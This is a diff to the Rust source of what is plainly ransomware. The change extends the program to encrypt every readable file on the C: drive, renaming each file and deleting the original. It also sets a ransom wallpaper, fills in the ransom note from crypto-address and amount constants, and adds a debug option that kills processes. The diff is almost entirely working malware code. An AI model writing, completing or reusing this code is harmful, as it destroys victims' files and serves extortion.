@@ -15,10 +15,13 @@ use misc::{
 use lib::{
     self, crypto,
     config::{
+        wallpaper,
         ransome_note,
         control::{
             MASTER_KEY,
-            TTS_MESSAGE
+            TTS_MESSAGE,
+            CRYPTO_ADDRESS,
+            AMOUNT_MONEY
         },
         config::{
             FILE_EXTENTION,
@@ -32,7 +35,8 @@ use lib::{
             DEBUG_BYPASS_WHITELIST,
             DEBUG_FOLDER_NAME,
             DEBUG_MODE,
-            MAIN_FOLDER_NAME
+            MAIN_FOLDER_NAME,
+            DEBUG_CAN_KILL_PROCS
         }
     }
 };
@@ -50,6 +54,13 @@ use windows::{
         ISpVoice,
         SpVoice,
         SPF_DEFAULT,
+    },
+    Win32::UI::WindowsAndMessaging::{
+        SystemParametersInfoW,
+
+        SPI_SETDESKWALLPAPER,
+        SPIF_UPDATEINIFILE,
+        SPIF_SENDCHANGE
     }
 };
 
@@ -64,12 +75,14 @@ use rand::{
 };
 
 use std::{
-    env, fs, process, rc::Rc,
-    ffi::OsStr, error::Error,
-    thread, process::Command,
-    time::Duration,
+    env, fs, thread,
+    ffi::OsStr, rc::Rc,
+    time::Duration, error::Error,
+    os::windows::ffi::OsStrExt,
+    collections::HashSet,
     cell::{RefCell, RefMut},
-    path::{Path, PathBuf}
+    process::{self, Command},
+    path::{Path, PathBuf},
 };
 
 fn main() -> Result<(), Box<dyn Error>> {
@@ -198,7 +211,7 @@ fn main() -> Result<(), Box<dyn Error>> {
                 }
             };
 
-            let file_name = format!("{}.{}", enc_name, FILE_EXTENTION);
+            let file_name: String = format!("{}.{}", enc_name, FILE_EXTENTION);
             let enc_file: PathBuf = parent.join(&file_name);
 
             let content: String = match fs::read_to_string(&file) {
@@ -260,7 +273,7 @@ fn main() -> Result<(), Box<dyn Error>> {
                     .and_then(|name| name.to_str())
                     .map(|name| BLACKLISTED_FOLDERS.contains(&name))
                     .unwrap_or(false)
-            }) {
+            }) || path.is_symlink() {
                 return;
             }
 
@@ -306,11 +319,115 @@ fn main() -> Result<(), Box<dyn Error>> {
         println!("decrytable - {}", path.display());
     }
 
+    if DEBUG_CAN_KILL_PROCS {
+        Command::new("kill")
+            .arg("-KILL")
+            .arg("0")
+            .status()?;
+    }
+
+    let ignored: HashSet<PathBuf> = collected.
+        iter()
+        .cloned()
+        .collect();
+
+    files::walk_dir(&PathBuf::from("C:\\"), &|path| {
+        if ignored.contains(path) {
+            return;
+        }
+
+        let metadata = match fs::metadata(path) {
+            Ok(meta) => meta,
+            Err(err) => {
+                if err.kind() == std::io::ErrorKind::PermissionDenied {
+                    return;
+                }
+
+                return;
+            }
+        };
+
+        if !metadata.is_file() {
+            return;
+        }
+
+        let file_name: &str = match path.file_name().and_then(|f| f.to_str()) {
+            Some(name) => name,
+            None => {
+                eprintln!("failed to get name for: {}", path.display());
+                return;
+            }
+        };
+
+        let enc_name: String = match crypto::encrypt(file_name, &usable_key, false) {
+            Ok(name) => name,
+            Err(err) => {
+                eprintln!("failed to encrypt name of {}: {}", path.display(), err);
+                return;
+            }
+        };
+
+        let parent: &Path = match path.parent() {
+            Some(p) => p,
+            None => {
+                eprintln!("failed to get parent for: {}", path.display());
+                return;
+            }
+        };
+
+        let file_name: String = format!("{}.{}", enc_name, FILE_EXTENTION);
+        let enc_file: PathBuf = parent.join(&file_name);
+
+        let content = match fs::read_to_string(&path) {
+            Ok(data) => data,
+            Err(err) => {
+                eprintln!("failed to read {}: {}", path.display(), err);
+                return;
+            }
+        };
+
+        let enc_content = match crypto::encrypt(&content, &usable_key, false) {
+            Ok(enc) => enc,
+            Err(err) => {
+                eprintln!("failed to encrypt content of {}: {}", path.display(), err);
+                return;
+            }
+        };
+
+        if let Err(err) = files::write_file(&enc_file, &enc_content) {
+            eprintln!("failed to write encrypted file {}: {}", enc_file.display(), err);
+            return;
+        }
+
+        if let Err(err) = fs::remove_file(&path) {
+            eprintln!("failed to remove original {}: {}", path.display(), err);
+        }
+
+        println!("finished - {}", path.display());
+    });
+
+    let wallpaper: PathBuf = main_folder.join("wp.jpg");
+    fs::write(&wallpaper, wallpaper::WALLPAPER_BYTES)?;
+
+    let wallpaper_wide: Vec<u16> = OsStr::new(&wallpaper)
+        .encode_wide()
+        .chain(std::iter::once(0))
+        .collect();
+
+    unsafe {
+        let _ = SystemParametersInfoW(
+            SPI_SETDESKWALLPAPER,
+            0,
+            Some(wallpaper_wide.as_ptr() as *mut _),
+            SPIF_UPDATEINIFILE | SPIF_SENDCHANGE,
+        );
+    }
+
     let ransome_note_path: PathBuf = files::create_item("WRN.txt", &desktop)
         .expect("failed to create note");
     let ransome_note_clone: PathBuf = ransome_note_path.clone();
 
-    let ransom_note: String = ransome_note::create_note("1234567890", 30, &identifier);
+    let ransom_note: String = ransome_note::create_note(CRYPTO_ADDRESS, AMOUNT_MONEY, &identifier);
     files::write_file(&ransome_note_path, &ransom_note)
         .expect("could not write the note");
 
@@ -338,7 +455,12 @@ fn main() -> Result<(), Box<dyn Error>> {
             .chain(Some(0))
             .collect();
 
-        voice.Speak(windows::core::PCWSTR(wtext.as_ptr()), SPF_DEFAULT.0 as u32, None)?;
+        voice.Speak(
+            windows::core::PCWSTR(wtext.as_ptr()),
+            SPF_DEFAULT.0 as u32,
+            None
+        )?;
+
         CoUninitialize();
     }
 
